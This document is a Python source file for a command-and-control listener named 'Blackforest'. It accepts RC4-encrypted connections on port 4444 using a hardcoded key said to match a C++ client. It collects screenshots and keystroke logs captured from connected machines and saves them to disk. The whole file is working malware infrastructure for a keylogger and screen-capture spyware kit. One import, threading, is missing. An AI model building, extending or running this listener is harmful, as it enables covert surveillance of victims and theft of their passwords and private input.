import socket
import datetime
import logging
import base64
import time

# Configuration
HOST = '0.0.0.0'  # Listen on all interfaces
PORT = 4444
LOG_FILE = "blackforest_logs.txt"

# RC4 Implementation
class RC4:
    def __init__(self, key):
        self.S = list(range(256))
        j = 0
        for i in range(256):
            j = (j + self.S[i] + key[i % len(key)]) % 256
            self.S[i], self.S[j] = self.S[j], self.S[i]
        self.i = 0
        self.j = 0

    def crypt(self, data):
        out = []
        for char in data:
            self.i = (self.i + 1) % 256
            self.j = (self.j + self.S[self.i]) % 256
            self.S[self.i], self.S[self.j] = self.S[self.j], self.S[self.i]
            out.append(char ^ self.S[(self.S[self.i] + self.S[self.j]) % 256])
        return bytes(out)

def handle_client(client, addr):
    # Key: DEADBEEF... (Matches C++ Key)
    key = bytes([0xDE, 0xAD, 0xBE, 0xEF, 0xCA, 0xFE, 0xBA, 0xBE])
    cipher = RC4(key)

    # print(f"[+] Connection accepted from {addr[0]}:{addr[1]}") # Too spammy
    
    # Log new connection
    # connection_log_message = f"\n--- New Connection from {addr[0]} at {datetime.datetime.now()} ---\n"
    # with open(LOG_FILE, "a") as f:
    #    f.write(connection_log_message)
    # logging.info(f"New Connection from {addr[0]}")
        
    buffer = ""
    while True:
        try:
            data = client.recv(4096)
            if not data:
                break # Client disconnected
            
            # Decrypt Traffic
            data = cipher.crypt(data)
            if not data:
                break # Client disconnected
            
            decoded = data.decode('utf-8', errors='ignore')
            
            if "SCREENSHOT[" in decoded:
                try:
                    # Parse Size
                    start_idx = decoded.find("SCREENSHOT[")
                    end_idx = decoded.find("]:", start_idx)
                    if start_idx != -1 and end_idx != -1:
                        size_str = decoded[start_idx+11 : end_idx]
                        total_size = int(size_str)
                        
                        raw_header = f"SCREENSHOT[{size_str}]:".encode('utf-8')
                        header_pos = data.find(raw_header)
                        
                        collected_data = data[header_pos + len(raw_header):]
                        collected_len = len(collected_data)
                        
                        print(f"[*] Receiving Screenshot ({total_size} bytes) from {addr[0]}...")
                        
                        while collected_len < total_size:
                            chunk = client.recv(4096)
                            if not chunk: break
                            chunk = cipher.crypt(chunk) # Decrypt chunk
                            if not chunk: break
                            collected_data += chunk
                            collected_len += len(chunk)
                        
                        timestamp = int(time.time())
                        filename = f"screenshot_{addr[0]}_{timestamp}.jpg"
                        
                        try:
                            img_bytes = base64.b64decode(collected_data)
                            with open(filename, "wb") as img_file:
                                img_file.write(img_bytes)
                            print(f"[+] SCREENSHOT SAVED: {filename}")
                            logging.info(f"SCREENSHOT SAVED: {filename}")
                        except Exception as e:
                            print(f"[!] Save Error: {e}")
                            
                        continue 
                        
                except Exception as e:
                    print(f"[!] Header Parse Error: {e}")
            
            elif "[KEYLOG]:" in decoded:
                clean_log = decoded.replace("[KEYLOG]: ", "")
                # print(f"[{addr[0]}]: {clean_log}", end='', flush=True) 
                # Keep it clean, just print text
                print(clean_log, end='', flush=True)
                logging.info(clean_log.strip())
                
            else:
                print(decoded, end='', flush=True)
                if decoded.strip(): 
                    logging.info(decoded.strip())

        except ConnectionResetError:
            break 
        except Exception as e:
            # print(f"[!] Error receiving data: {e}", flush=True)
            break 
    
    # print(f"\n[-] Connection closed from {addr[0]}")
    client.close()

def start_server():
    print(f"[*] Starting Blackforest Listener on {HOST}:{PORT}")
    print(f"[*] Logs will be saved to {LOG_FILE}")
    
    logging.basicConfig(filename=LOG_FILE, level=logging.INFO, format='%(message)s')
    
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind((HOST, PORT))
    server.listen(5)
    
    while True:
        try:
            client, addr = server.accept()
            # Spawn Thread
            t = threading.Thread(target=handle_client, args=(client, addr))
            t.daemon = True
            t.start()
            
        except KeyboardInterrupt:
            print("\n[*] Stopping server...")
            break
        except Exception as e:
            print(f"[!] Server Error: {e}")

if __name__ == "__main__":
    start_server()
